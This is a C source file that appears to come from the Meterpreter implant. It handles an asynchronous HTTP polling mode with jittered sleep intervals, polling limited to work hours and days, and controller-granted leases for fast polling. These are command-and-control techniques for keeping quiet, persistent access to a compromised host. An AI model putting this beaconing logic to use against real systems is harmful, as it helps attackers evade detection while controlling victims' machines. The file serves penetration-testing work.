/*!
 * @file core_async.c
 * @brief Handles the core async mode command for HTTP transports.
 */
#include "metsrv.h"

// Explicit leases keep a queued job responsive without guessing from recent
// packet activity. The bounded TTL returns the target to scheduled polling if
// the Framework job disappears.
#define ASYNC_LEASE_POLL_MS 1000
#define ASYNC_LEASE_DEFAULT_TTL 300
#define ASYNC_LEASE_MIN_TTL 30
#define ASYNC_LEASE_MAX_TTL 3600
#define ASYNC_POLL_MAX_SECONDS 86400

/*!
 * @brief Extend an active async job lease from the current monotonic time.
 * @param ctx Pointer to the HTTP transport context containing async config.
 */
VOID async_touch_lease(HttpTransportContext* ctx)
{
	if (ctx == NULL || !ctx->async_lease_active)
	{
		return;
	}
	ctx->async_lease_deadline_ticks = GetTickCount() + ctx->async_lease_ttl * 1000;
}

/*!
 * @brief Determine whether a controller-owned job lease remains active.
 * @param ctx Pointer to the HTTP transport context containing async config.
 * @returns TRUE if the target should continue rapid polling.
 */
BOOL async_lease_is_active(HttpTransportContext* ctx)
{
	if (ctx == NULL || !ctx->async_lease_active)
	{
		return FALSE;
	}

	if ((LONG)(ctx->async_lease_deadline_ticks - GetTickCount()) <= 0)
	{
		ctx->async_lease_active = FALSE;
		ctx->async_lease_deadline_ticks = 0;
		return FALSE;
	}

	return TRUE;
}

/*!
 * @brief Determine if the current local hour falls within business hours on an active day.
 * @param ctx Pointer to the HTTP transport context containing async config.
 * @returns TRUE if currently within configured work hours, FALSE otherwise.
 */
BOOL async_in_work_hours(HttpTransportContext* ctx)
{
	SYSTEMTIME st;
	GetLocalTime(&st);

	// Check if current hour is within work hours
	if (ctx->async_work_start < ctx->async_work_end)
	{
		// Normal range, e.g. 8-17
		return (st.wHour >= ctx->async_work_start && st.wHour < ctx->async_work_end)
			&& (ctx->async_work_days == 0 || (ctx->async_work_days & (1 << st.wDayOfWeek)) != 0);
	}
	else if (ctx->async_work_start > ctx->async_work_end)
	{
		if (st.wHour >= ctx->async_work_start)
		{
			return ctx->async_work_days == 0 || (ctx->async_work_days & (1 << st.wDayOfWeek)) != 0;
		}
		else if (st.wHour < ctx->async_work_end)
		{
			UINT previousDay = (st.wDayOfWeek + 6) % 7;
			return ctx->async_work_days == 0 || (ctx->async_work_days & (1 << previousDay)) != 0;
		}

		return FALSE;
	}

	// If start == end, treat as 24h on active days
	return ctx->async_work_days == 0 || (ctx->async_work_days & (1 << st.wDayOfWeek)) != 0;
}

/*!
 * @brief Calculate the sleep duration in milliseconds for the current async poll cycle.
 * @param ctx Pointer to the HTTP transport context containing async config.
 * @returns Sleep duration in milliseconds with jitter applied. Returns a short
 *          rapid interval (no jitter) while an explicit job lease is active.
 */
DWORD async_calculate_sleep_ms(HttpTransportContext* ctx)
{
	if (async_lease_is_active(ctx))
	{
		return ASYNC_LEASE_POLL_MS;
	}

	ULONGLONG intervalMs = (ULONGLONG)ctx->async_poll_interval * 1000;

	if (ctx->async_poll_jitter > 0 && ctx->async_poll_jitter < 100)
	{
		// Apply jitter: interval ± jitter%
		ULONGLONG jitterRange = (intervalMs * ctx->async_poll_jitter) / 100;
		// Random value in range [0, 2*jitterRange], then shift to [-jitterRange, +jitterRange]
		DWORD randomValue;
		if (jitterRange > 0)
		{
			randomValue = ((DWORD)rand() << 16) ^ (DWORD)rand();
			intervalMs = intervalMs - jitterRange + (randomValue % (DWORD)(2 * jitterRange + 1));
		}
	}

	return (DWORD)intervalMs;
}

/*!
 * @brief Handle the COMMAND_ID_CORE_ASYNC_MODE request.
 * @param remote Pointer to the \c Remote instance.
 * @param packet Pointer to the incoming request \c Packet.
 * @returns Indication of success or failure.
 */
DWORD request_core_async_mode(Remote* remote, Packet* packet)
{
	Packet* response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Transport* transport = remote->transport;

	// Async mode is only supported on HTTP transports
	if (!(transport->type & METERPRETER_TRANSPORT_HTTP))
	{
		dprintf("[ASYNC] Async mode is only supported on HTTP transports");
		result = ERROR_NOT_SUPPORTED;
	}
	else
	{
		HttpTransportContext* ctx = (HttpTransportContext*)transport->ctx;

		BOOL enabled = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_ASYNC_ENABLED);
		ctx->async_mode = enabled;
		remote->async_mode = enabled;

		if (enabled)
		{
			UINT pollInterval = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_POLL_INTERVAL);
			UINT pollJitter = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_POLL_JITTER);
			UINT workStart = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_START);
			UINT workEnd = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_END);
			UINT workDays = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_WORK_DAYS);

			// Apply poll interval (minimum 10 seconds to avoid spin)
            if (pollInterval > ASYNC_POLL_MAX_SECONDS)
            {
                ctx->async_poll_interval = ASYNC_POLL_MAX_SECONDS;
            }
            else if (pollInterval >= 10)
			{
				ctx->async_poll_interval = pollInterval;
			}
			else if (pollInterval > 0)
			{
				ctx->async_poll_interval = 10;
			}
			else
			{
				// Default to 300 seconds if not specified
				ctx->async_poll_interval = 300;
			}

			// Jitter must be 0-99
			if (pollJitter < 100)
			{
				ctx->async_poll_jitter = pollJitter;
			}
			else
			{
				ctx->async_poll_jitter = 0;
			}

			// Work hours (0-23, end also accepts 24 meaning midnight)
			ctx->async_work_start = (workStart <= 23) ? workStart : 0;
			ctx->async_work_end = (workEnd <= 24) ? workEnd : 0;

			// Work days bitmask (7 bits: bit0=Sun..bit6=Sat)
			ctx->async_work_days = workDays & 0x7F;

			ctx->async_lease_active = FALSE;
			ctx->async_lease_ttl = 0;
			ctx->async_lease_deadline_ticks = 0;

			// Create the wake event (auto-reset) so sleeps can be interrupted
			if (ctx->async_wake_event == NULL)
			{
				ctx->async_wake_event = CreateEvent(NULL, FALSE, FALSE, NULL);
			}

			dprintf("[ASYNC] Async mode enabled: interval=%us, jitter=%u%%, hours=%u-%u, days=0x%02X",
				ctx->async_poll_interval, ctx->async_poll_jitter,
				ctx->async_work_start, ctx->async_work_end, ctx->async_work_days);
		}
		else
		{
			dprintf("[ASYNC] Async mode disabled");

			// Signal the wake event to interrupt any in-progress async sleep
			if (ctx->async_wake_event != NULL)
			{
				SetEvent(ctx->async_wake_event);
				CloseHandle(ctx->async_wake_event);
				ctx->async_wake_event = NULL;
			}

			ctx->async_poll_interval = 0;
			ctx->async_poll_jitter = 0;
			ctx->async_work_start = 0;
			ctx->async_work_end = 0;
			ctx->async_work_days = 0;
			ctx->async_lease_active = FALSE;
			ctx->async_lease_ttl = 0;
			ctx->async_lease_deadline_ticks = 0;
		}

		met_api->packet.add_tlv_bool(response, TLV_TYPE_ASYNC_ENABLED, ctx->async_mode);
	}

	met_api->packet.transmit_response(result, remote, response);

	return result;
}

/*!
 * @brief Return the target UTC and local wall-clock timestamps.
 */
DWORD request_core_get_target_time(Remote* remote, Packet* packet)
{
	Packet* response = met_api->packet.create_response(packet);
	if (response == NULL)
	{
		return ERROR_NOT_ENOUGH_MEMORY;
	}

	packet_add_target_time(response);
	met_api->packet.transmit_response(ERROR_SUCCESS, remote, response);
	return ERROR_SUCCESS;
}

/*!
 * @brief Acquire, renew, or release a controller-owned async job lease.
 */
DWORD request_core_async_lease(Remote* remote, Packet* packet)
{
	Packet* response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Transport* transport = remote->transport;
	HttpTransportContext* ctx = NULL;

	if (response == NULL)
	{
		return ERROR_NOT_ENOUGH_MEMORY;
	}

	if (!(transport->type & METERPRETER_TRANSPORT_HTTP))
	{
		result = ERROR_NOT_SUPPORTED;
	}
	else
	{
		BOOL enabled = met_api->packet.get_tlv_value_bool(packet, TLV_TYPE_ASYNC_LEASE_ENABLED);
		ctx = (HttpTransportContext*)transport->ctx;

		if (enabled && !ctx->async_mode)
		{
			result = ERROR_NOT_SUPPORTED;
		}
		else if (enabled)
		{
			UINT ttl = met_api->packet.get_tlv_value_uint(packet, TLV_TYPE_ASYNC_LEASE_TTL);
			if (ttl == 0)
			{
				ttl = ASYNC_LEASE_DEFAULT_TTL;
			}
			else if (ttl < ASYNC_LEASE_MIN_TTL)
			{
				ttl = ASYNC_LEASE_MIN_TTL;
			}
			else if (ttl > ASYNC_LEASE_MAX_TTL)
			{
				ttl = ASYNC_LEASE_MAX_TTL;
			}

			ctx->async_lease_ttl = ttl;
			ctx->async_lease_active = TRUE;
			async_touch_lease(ctx);
			if (ctx->async_wake_event != NULL)
			{
				SetEvent(ctx->async_wake_event);
			}
		}
		else
		{
			ctx->async_lease_active = FALSE;
			ctx->async_lease_ttl = 0;
			ctx->async_lease_deadline_ticks = 0;
		}
	}

	met_api->packet.add_tlv_bool(response, TLV_TYPE_ASYNC_LEASE_ENABLED, ctx != NULL && async_lease_is_active(ctx));
	met_api->packet.transmit_response(result, remote, response);
	return result;
}
